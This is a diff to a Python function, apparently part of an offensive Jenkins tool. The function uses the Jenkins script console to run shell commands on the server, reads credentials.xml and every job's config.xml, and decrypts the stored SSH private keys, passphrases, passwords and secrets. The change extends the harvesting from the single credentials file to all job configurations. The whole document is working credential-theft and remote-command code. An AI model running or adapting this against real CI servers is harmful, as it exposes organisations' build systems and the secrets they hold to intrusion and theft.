@@ -97,52 +97,57 @@ def credential_recovery(target):
         else:
             path = '/var/lib/jenkins'
 
-        credentials_xml = script_interface(url, 'println "cat ' + path + '/credentials.xml".execute().text')
-        soup = BeautifulSoup(credentials_xml, 'lxml')
-        for element in soup.find_all('id'):
-            uuid = element.get_text(strip=True)
-            parent = element.parent
-            description = 'None'
-            if parent.find('description'):
-                description = parent.find('description').get_text(strip=True)
-            if parent.find('privatekey'):
-                username = parent.find('username').get_text(strip=True)
-                enc_key = parent.find('privatekey').get_text(strip=True)
-                enc_passphrase = parent.find('passphrase').get_text(strip=True)
-                key = decrypt_secret(url, enc_key).strip()
-                passphrase = decrypt_secret(url, enc_passphrase).strip()
-                creds.update({
-                    uuid: {
-                        'type': 'key', 
-                        'description': description,
-                        'username': username,
-                        'passphrase': passphrase,
-                        'key': key
-                    }
-                })
-            elif parent.find('password'):
-                username = parent.find('username').get_text(strip=True)
-                enc_password = parent.find('password').get_text(strip=True)
-                password = decrypt_secret(url, enc_password).strip()
-                creds.update({
-                    uuid: {
-                        'type': 'password',
-                        'description': description,
-                        'username': username,
-                        'password': password
-                    }
-                })
-            elif parent.find('secret'):
-                enc_secret = parent.find('secret').get_text(strip=True)
-                secret = decrypt_secret(url, enc_secret).strip()
-                creds.update({
-                    uuid: {
-                        'type': 'secret',
-                        'description': description,
-                        'secret': secret
-                    }
-                })
-
+        res = script_interface(url, 'println "ls ' + path + '/jobs".execute().text')
+        job_configs = []
+        for job in res.split('\n'):
+            job_configs.append('/jobs/' + job + '/config.xml')
+        cred_files = job_configs + ['/credentials.xml']
+        for cred_file in cred_files:
+            credentials_xml = script_interface(url, 'println "cat ' + path + cred_file + '".execute().text')
+            soup = BeautifulSoup(credentials_xml, 'lxml')
+            for element in soup.find_all('id'):
+                uuid = element.get_text(strip=True)
+                parent = element.parent
+                description = 'None'
+                if parent.find('description'):
+                    description = parent.find('description').get_text(strip=True)
+                if parent.find('privatekey'):
+                    username = parent.find('username').get_text(strip=True)
+                    enc_key = parent.find('privatekey').get_text(strip=True)
+                    enc_passphrase = parent.find('passphrase').get_text(strip=True)
+                    key = decrypt_secret(url, enc_key).strip()
+                    passphrase = decrypt_secret(url, enc_passphrase).strip()
+                    creds.update({
+                        uuid: {
+                            'type': 'key', 
+                            'description': description,
+                            'username': username,
+                            'passphrase': passphrase,
+                            'key': key
+                        }
+                    })
+                elif parent.find('password'):
+                    username = parent.find('username').get_text(strip=True)
+                    enc_password = parent.find('password').get_text(strip=True)
+                    password = decrypt_secret(url, enc_password).strip()
+                    creds.update({
+                        uuid: {
+                            'type': 'password',
+                            'description': description,
+                            'username': username,
+                            'password': password
+                        }
+                    })
+                elif parent.find('secret'):
+                    enc_secret = parent.find('secret').get_text(strip=True)
+                    secret = decrypt_secret(url, enc_secret).strip()
+                    creds.update({
+                        uuid: {
+                            'type': 'secret',
+                            'description': description,
+                            'secret': secret
+                        }
+                    })
     return creds
 
 def assess(target):
